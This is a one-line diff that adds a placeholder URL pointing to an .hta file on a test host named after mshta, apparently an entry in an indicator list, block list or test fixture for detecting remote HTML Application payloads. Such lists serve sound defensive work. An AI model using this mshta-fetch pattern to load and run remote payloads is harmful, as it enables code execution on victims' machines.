@@ -1,0 +1,1 @@
+https://mshta-3.example.test/c.hta
